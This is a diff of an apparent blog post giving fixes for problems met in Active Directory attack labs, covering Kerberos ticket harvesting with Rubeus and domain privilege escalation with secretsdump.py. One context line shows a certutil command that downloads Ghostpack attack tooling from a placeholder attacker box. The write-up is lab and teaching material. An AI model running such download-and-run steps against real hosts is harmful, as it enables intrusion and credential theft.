@@ -9,9 +9,7 @@ subtitle: "Fighting old battles again?"
 
 List of issues encountered and their corresponding bypasses / fixes
 
-## Attacking Kerberos
-
-### Harvesting & Brute-Forcing Tickets w/ Rubeus
+## Attacking Kerberos - Harvesting & Brute-Forcing Tickets w/ Rubeus
 
 The middleman machine's RDP never accepts the password provided. 
 
@@ -47,9 +45,7 @@ certutil.exe -urlcache -split -f http://<AttackBox_IP>:8000/Ghostpack-CompiledBi
 
 You should then see a request in the http.server logs. Now you can run Rubeus. Luckily, all required .Net Framework packages are already on the host.
 
-## Attacktive Directory
-
-### Elevating Privileges within the Domain
+## Attacktive Directory - Elevating Privileges within the Domain
 
 I encountered issues with the operation of `secretsdump.py` (stock or modified). Maybe it's related to AttackBox, maybe it's related to impacket. However, I found an easy workaround to the problem,
 
